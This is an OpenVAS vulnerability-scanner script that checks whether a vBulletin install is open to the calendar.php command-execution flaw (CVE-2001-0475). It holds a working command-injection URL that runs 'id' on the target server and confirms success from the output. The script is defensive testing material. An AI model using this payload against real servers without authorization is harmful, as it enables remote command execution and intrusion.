# OpenVAS Vulnerability Test
# $Id: vbulletin_calender_command_execution.nasl 11556 2018-09-22 15:37:40Z cfischer $
# Description: vBulletin's Calendar Command Execution Vulnerability
#
# Authors:
# SecurITeam
#
# Copyright:
# Copyright (C) 2002 SecurITeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11179");
  script_version("2019-04-10T13:42:28+0000");
  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2474);
  script_cve_id("CVE-2001-0475");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("vBulletin's Calendar Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 SecurITeam");
  script_family("Web application abuses");
  script_dependencies("vbulletin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("vBulletin/installed");

  script_xref(name:"URL", value:"http://www.securiteam.com/securitynews/5IP0B203PI.html");

  script_tag(name:"summary", value:"A vulnerability in vBulletin enables attackers to craft special URLs
  that will execute commands on the server through the vBulletin PHP script.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

install = get_kb_item("www/" + port + "/vBulletin");
if(!install)
  exit(0);

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if(matches[2]) {

  dir = matches[2];

  http_check_remote_code(unique_dir:dir,
                         check_request:"/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22",
                         check_result:"uid=[0-9]+.*gid=[0-9]+.*",
                         command:"id");
  exit(99);
}

exit(0);